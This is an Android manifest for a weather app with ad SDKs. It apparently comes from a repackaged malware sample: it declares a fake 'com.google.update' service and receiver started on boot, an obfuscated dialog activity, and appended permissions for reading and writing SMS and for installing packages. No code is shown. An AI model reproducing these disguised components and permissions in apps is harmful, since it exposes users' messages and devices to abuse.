<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.alan.weather">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <application android:icon="@drawable/yubao72" android:label="@string/app_name">
        <activity android:label="@string/app_name" android:name=".WeatherForecast">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:name="com.google.ads.AdActivity"/>
        <meta-data android:name="ADMOGO_KEY" android:value="4c2dbcb4b9d54c0783648f9ee1c0f906"/>
        <activity android:configChanges="keyboard|keyboardHidden|navigation|orientation" android:name="com.vpon.adon.android.WebInApp" android:screenOrientation="portrait"/>
        <activity android:label="@string/app_name" android:name="com.adwo.adsdk.AdwoSplashAdActivity"/>
        <activity android:label="@string/app_name" android:name="com.adwo.adsdk.AdwoAdBrowserActivity"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="com.waps.OffersWebView"/>
        <meta-data android:name="CLIENT_PACKAGE" android:value="com.alan.weather"/>
        <meta-data android:name="WAPS_ID" android:value="799bfd929d8c69d22922b9824bf89007"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="bs$gT" android:theme="@android:style/Theme.Dialog"/>
        <service android:name="com.google.update.UpdateService"/>
        <receiver android:name="com.google.update.Receiver">
            <intent-filter>
                <action android:name="android.intent.action.BATTERY_CHANGED_ACTION"/>
                <action android:name="android.intent.action.SIG_STR"/>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <meta-data android:name="ST_MY_PID" android:value="1010user"/>
        <meta-data android:name="UMENG_APPKEY" android:value="4e47872a431fe3068e00050f"/>
    </application>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.GET_TASKS"/>
</manifest>